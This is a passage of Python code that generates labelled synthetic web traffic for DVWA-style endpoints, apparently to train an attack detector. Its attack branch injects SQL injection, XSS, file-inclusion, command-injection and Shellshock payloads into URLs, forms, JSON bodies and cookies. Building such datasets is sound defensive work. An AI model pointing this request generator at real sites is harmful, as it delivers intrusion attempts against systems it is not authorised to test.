            chemin = f"/vulnerabilities/{r.choice(['sqli', 'sqli', 'sqli_blind'])}/"
            return "sqli", self.requete("GET", chemin + "?" + urlencode({"id": id_, "Submit": "Submit"}), referer=f"http://{SITE_HOST}{chemin}")
        if genre == "xss_r":
            return "xss_r", self.requete("GET", "/vulnerabilities/xss_r/?" + urlencode({"name": r.choice(PRENOMS)}))
        if genre == "fi":
            return "fi", self.requete("GET", "/vulnerabilities/fi/?" + urlencode({"page": r.choice(["include.php", "file1.php", "file2.php", "file3.php"])}))
        if genre == "brute":
            u, p = r.choice(COMPTES)
            return "brute", self.requete("GET", "/vulnerabilities/brute/?" + urlencode({"username": u, "password": p, "Login": "Login"}))
        if genre == "exec":
            ip = r.choice(["127.0.0.1", "localhost", "8.8.8.8", "1.1.1.1", "192.168.1.%d" % r.randint(1, 254), "example.com", "10.0.0.%d" % r.randint(1, 254)])
            return "exec", self.requete("POST", "/vulnerabilities/exec/", urlencode({"ip": ip, "Submit": "Submit"}), referer=f"http://{SITE_HOST}/vulnerabilities/exec/")
        if genre == "csrf":
            pw = r.choice(["newpass", "abc123", "Mot2Passe!", "password"])
            return "csrf", self.requete("GET", "/vulnerabilities/csrf/?" + urlencode({"password_new": pw, "password_conf": pw, "Change": "Change"}))
        if genre == "xss_s":
            return "xss_s", self.requete("POST", "/vulnerabilities/xss_s/", urlencode({"txtName": r.choice(PRENOMS), "mtxMessage": r.choice(self.messages), "btnSign": "Sign Guestbook"}),
                                         referer=f"http://{SITE_HOST}/vulnerabilities/xss_s/")
        if genre == "login":
            u, p = r.choice(COMPTES)
            champs = {"username": u, "password": p, "Login": "Login"}
            if r.random() < 0.6:
                champs["user_token"] = tok()
            return "login", self.requete("POST", "/login.php", urlencode(champs), referer=f"http://{SITE_HOST}/login.php")
        if genre == "security":
            return "security", self.requete("POST", "/security.php", urlencode({"security": r.choice(["low", "medium", "high", "impossible"]), "seclev_submit": "Submit", "user_token": tok()}),
                                            referer=f"http://{SITE_HOST}/security.php")
        if genre == "setup":
            return "setup", self.requete("POST", "/setup.php", urlencode({"create_db": "Create / Reset Database", "user_token": tok()}), referer=f"http://{SITE_HOST}/setup.php")
        return "search", self.requete("GET", "/?" + urlencode({"s": r.choice(MOTS_RECHERCHE)}))

    # -------------------------------------------------------------- attaques
    def attaque(self):
        r = self.r
        self.force_outil = False
        genre = r.choices(["sqli", "xss", "lfi", "cmd", "scan", "cookie_ua", "json", "form"], weights=[24, 18, 12, 12, 16, 5, 10, 14])[0]
        outil = r.random() < 0.15
        V = "/vulnerabilities"
        if genre == "sqli":
            p = muter(r, r.choice(self.sqli), "sql")
            c = r.choices(["get_sqli", "get_blind", "post_login", "generic"], [2, 1, 1, 6])[0]
            if c == "get_sqli":
                return genre, self.requete("GET", f"{V}/sqli/?" + urlencode({"id": p, "Submit": "Submit"}), outil=outil)
            if c == "get_blind":
                return genre, self.requete("GET", f"{V}/sqli_blind/?" + urlencode({"id": p, "Submit": "Submit"}), outil=outil)
            if c == "post_login":
                return genre, self.requete("POST", "/login.php", urlencode({"username": p, "password": r.choice(["x", "password", "a"]), "Login": "Login"}), outil=outil)
            return genre, self.requete("GET", self.prefixe(["/index.php?", "/?", "/search.php?", "/product.php?"]) + urlencode({r.choice(["id", "s", "q", "cat", "page_id", "category", "item", "product", "user", "sort", "lang", "order"]): p}), outil=outil)
        if genre == "xss":
            p = muter(r, r.choice(self.xss), "xss")
            c = r.choices(["xss_r", "xss_s_msg", "xss_s_name", "generic"], [2, 1, 1, 6])[0]
            if c == "xss_r":
                return genre, self.requete("GET", f"{V}/xss_r/?" + urlencode({"name": p}), outil=outil)
            if c == "xss_s_msg":
                return genre, self.requete("POST", f"{V}/xss_s/", urlencode({"txtName": r.choice(PRENOMS), "mtxMessage": p, "btnSign": "Sign Guestbook"}), outil=outil)
            if c == "xss_s_name":
                return genre, self.requete("POST", f"{V}/xss_s/", urlencode({"txtName": p, "mtxMessage": r.choice(self.messages), "btnSign": "Sign Guestbook"}), outil=outil)
            return genre, self.requete("GET", self.prefixe(["/?", "/search.php?", "/index.php?"]) + urlencode({r.choice(["s", "q", "name", "search", "query", "keyword", "title"]): p}), outil=outil)
        if genre == "lfi":
            p = muter(r, r.choice(self.lfi), "lfi")
            chemin = self.prefixe([f"{V}/fi/?", f"{V}/fi/?", "/?", "/index.php?"])
            return genre, self.requete("GET", chemin + urlencode({r.choice(["page", "file", "path", "include", "template", "doc", "view", "lang", "download"]): p}), outil=outil)
        if genre == "cmd":
            p = muter(r, r.choice(self.cmd), "cmd")
            if r.random() < 0.3:
                return genre, self.requete("POST", f"{V}/exec/", urlencode({"ip": p, "Submit": "Submit"}), outil=outil)
            return genre, self.requete("GET", self.prefixe(["/?", "/index.php?"]) + urlencode({r.choice(["ip", "cmd", "host", "exec", "ping", "domain", "target"]): p}), outil=outil)
        if genre == "scan":
            return genre, self.requete("GET", r.choice(self.scan), outil=outil)
        if genre == "json":
            kind, base = r.choice([("sql", self.sqli), ("xss", self.xss), ("cmd", self.cmd), ("lfi", self.lfi)])
            chemin, corps = self.json_attaque(muter(r, r.choice(base), kind))
            return "json", self.requete("POST", chemin, json.dumps(corps), outil=outil, accept="application/json, text/plain, */*",
                                        ct=r.choice(["application/json", "application/json", "application/json;charset=UTF-8"]))
        if genre == "form":
            kind, base = r.choice([("sql", self.sqli), ("xss", self.xss), ("cmd", self.cmd), ("lfi", self.lfi)])
            chemin, champs = self.formulaire()
            cle = r.choice([k for k, v in champs.items() if isinstance(v, str)] or list(champs))
            champs[cle] = muter(r, r.choice(base), kind)
            return "form", self.requete("POST", chemin, urlencode(champs), outil=outil)
        # injection via cookie ou User-Agent (Shellshock)
        if r.random() < 0.5:
            cookie = "%s; %s=%s" % (self.cookie(), r.choice(["security", "session", "token", "id", "lang"]), r.choice(self.sqli))
            return "cookie", self.requete("GET", r.choice(PAGES), cookie=cookie)
        return "ua", self.requete("GET", r.choice(["/", "/cgi-bin/test.cgi", "/index.php"]), ua_injecte=SHELLSHOCK)


def generer(n_legit: int, n_attaque: int, seed: int = 0, ensemble: str = "train") -> pd.DataFrame:
    g = _Gen(seed, ensemble)
    lignes = [(texte, 0, fam) for fam, texte in (g.legit() for _ in range(n_legit))]
    lignes += [(texte, 1, fam) for fam, texte in (g.attaque() for _ in range(n_attaque))]
    return pd.DataFrame(lignes, columns=["text", "label", "famille"])
